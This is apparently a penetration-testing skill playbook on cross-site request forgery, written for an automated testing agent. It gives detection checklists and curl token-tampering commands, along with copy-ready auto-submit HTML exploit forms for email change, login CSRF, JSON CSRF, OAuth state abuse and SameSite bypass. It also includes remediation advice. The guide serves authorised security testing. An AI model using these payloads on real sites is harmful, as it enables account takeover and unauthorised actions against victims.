# Cross-Site Request Forgery (CSRF) — Skill Playbook

**Mitre ATT&CK ID:** T1189 (Drive-by Compromise)
**OWASP Mapping:** A01:2021 – Broken Access Control
**Severity:** High / Medium
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: csrf-v1
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1189
owasp_mapping:
  - A01:2021-BrokenAccessControl
tags:
  - csrf
  - xsrf
  - same-site
  - web-application
  - T1189
  - xss-chain
environments:
  - web
  - browser
  - oauth
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Candidate State-Changing Requests

Inspect every mutating action for CSRF protection:
- POST login/logout
- Email change, password reset
- Profile / settings updates
- Fund transfers, order placement, deletion
- OAuth authorization / token endpoints

### 1.2 Detection Checklist

1. Replay the request without any anti-CSRF token -> if it succeeds, no protection
2. Look for a token but verify it is actually validated (mutate or drop the token)
3. Inspect whether the token is tied to the session (compare two sessions' tokens)
4. Check `SameSite` attribute on the session cookie
5. Check that JSON endpoints reject `text/plain` but accept `application/json` cross-origin

### 1.3 GET-based State Changes

```http
GET /account/delete?id=1
GET /transfer?to=attacker&amount=1000
GET /logout
GET /order/cancel?order=ABC
```
Any GET that mutates state is a CSRF vector even with full anti-CSRF on POSTs.

---

## 2. Confirmation

### 2.1 Token Drop / Tamper

```bash
# Drop the token entirely
curl -s -X POST -b "session=AAA" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=attacker@evil.com' \
  "https://target.com/account/email"
# If email changes -> token not enforced

# Tamper the token
curl -s -X POST -b "session=AAA" \
  -d 'csrf=GARBAGE&email=attacker@evil.com' \
  "https://target.com/account/email"
```

### 2.2 SameSite Analysis

```bash
curl -sI https://target.com/login | grep -i set-cookie
# SameSite=Lax / Strict / None; no attribute defaults to Lax in modern browsers
```
- `SameSite=None; Secure` -> fully CSRF-able cross-site
- `SameSite=Lax` -> blocked on cross-site POST, but top-level GET navigations still send cookie (login CSRF, top-level GET CSRF)
- `SameSite=Strict` -> most robust; CSRF still possible via subdomains / same-site siblings

### 2.3 Token Reuse Across Sessions

```bash
# token from session A
curl -s -c a.txt "https://target.com/account" | grep -o 'name="csrf" value="[^"]*"'
# replay with session B cookie
curl -s -b b.txt -X POST -d "csrf=<tokenA>&email=x@e.com" "https://target.com/account/email"
# If accepted -> token not bound to session
```

---

## 3. Exploitation

### 3.1 Classic Form CSRF (auto-submit)

```html
<html>
<body>
<form method="POST" action="https://target.com/account/email" id="f">
  <input name="email" value="attacker@evil.com">
  <input name="csrf" value="PREDICTED_OR_STOLEN">
</form>
<script>document.getElementById('f').submit();</script>
</body>
</html>
```

### 3.2 Login CSRF

Force a victim to be logged in as the attacker's account, then all their future actions (searches, purchases, API usage) are attributed to the attacker account:
```html
<form method="POST" action="https://target.com/login">
  <input name="username" value="attacker_user">
  <input name="password" value="attacker_pass">
</form>
<script>document.forms[0].submit();</script>
```

### 3.3 JSON CSRF

Cross-origin `Content-Type: application/json` triggers a preflight; bypass by:
- Sending the JSON body with `text/plain` if the server accepts it
- Using a form with `enctype="text/plain"`:
```html
<form action="https://target.com/api/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","_ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```
Body sent as: `{"email":"attacker@evil.com","_ignore":"="}`

### 3.4 SameSite Bypass via Same-Site Subdomains

- Any sibling subdomain (e.g. `staging.target.com`) is same-site with `target.com` for `SameSite` purposes
- Host attacker content on a subdomain of the target to retain cookies and bypass `SameSite=Lax/Strict`

### 3.5 OAuth CSRF

- The `state` parameter is missing or not validated -> attacker pre-forges an authorization URL and tricks the victim into authorizing the attacker's client
- Login CSRF on the OAuth callback: attacker completes authorization, then delivers the callback URL to the victim to bind the attacker's OAuth identity to the victim's session

```http
GET /oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/callback&response_type=code
# no state -> victim authorizes attacker-controlled scope
```

### 3.6 CSRF Chained with XSS

Use stored XSS to bypass `SameSite=Strict` and execute state-changing requests within the victim's own origin where tokens are read live from the DOM.

---

## 4. Tool-Specific Guidance

### 4.1 Burp Suite CSRF Scanner

1. Send a state-changing request to the "CSRF Scanner" tab of Burp extensions
2. `Generate CSRF PoC` (right-click -> Engagement tools) produces an auto-submit form
3. Test token predictability and session-binding manually in Repeater

### 4.2 CSRF PoC generator (PortSwigger)

```
Right-click request -> Engagement tools -> Generate CSRF PoC
-> Options: include auto-submit script, change request method
```

### 4.3 curl-based checks

```bash
curl -s -X POST -b "session=AAA" -d 'email=x@e.com' https://target.com/account/email -o /dev/null -w "%{http_code}\n"
# 200/302 without token -> CSRF likely
```

---

## 5. PoC Generation

### PoC Template

```markdown
## CSRF — [FINDING_ID]

**URL:** https://target.com/account/email
**Method:** POST
**Protection status:** No token / token not validated / token not session-bound
**Cookie SameSite:** Lax / Strict / None

### Payload
```html
<form method="POST" action="https://target.com/account/email">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### Evidence
```
Request without token returned HTTP 200 and email changed to attacker@evil.com
```

### Impact
- State change: email/password/transfer
- Login CSRF: YES/NO
- OAuth flow: YES/NO

### Remediation
- Anti-CSRF token tied to session, validated for every mutating request
- Set `SameSite=Lax` or `Strict` (where safe) on session cookies
- Enforce correct `Content-Type` and validate `Origin`/`Sec-Fetch-Site` headers
- Use `state` parameter for OAuth

### Reproduction Steps
1. Drop CSRF token from POST, replay -> action succeeds
2. Host form on attacker domain, victim visits
3. Observe state change
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Token validation tested (drop, tamper, cross-session)
- [ ] SameSite behaviour verified in sandbox browser
- [ ] JSON/plaintext content-type bypass proven
- [ ] No destructive action performed against real accounts
- [ ] PoC hosted on controlled domain only

---

## 7. Cheat Sheet/Reference

| Vector | Payload / Note |
|---|---|
| Basic form | auto-submit `<form>` |
| Login CSRF | login form on attacker origin |
| JSON | `enctype="text/plain"` form |
| GET CSRF | `GET /transfer?to=x&amount=1` |
| SameSite None | `SameSite=None; Secure` fully exploitable |
| Subdomain | host on sibling subdomain to keep cookies |
| OAuth | missing `state` parameter |
| XSS chain | XSS within origin reads live CSRF token |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1189 | Drive-by Compromise | Initial access via victim visit |
| T1204.001 | User Execution: Malicious Link | Victim opens PoC |
| T1534 | Internal Spearphishing | Delivery |
| T1185 | Browser Session Hijacking | OAuth/CSRF combo |
| T1059.007 | JavaScript | XSS chain |

---

## 9. References

- PayloadsAllTheThings CSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
- HackTricks CSRF: https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
- PortSwigger CSRF: https://portswigger.net/web-security/csrf
- SameSite RFC 6265bis: https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
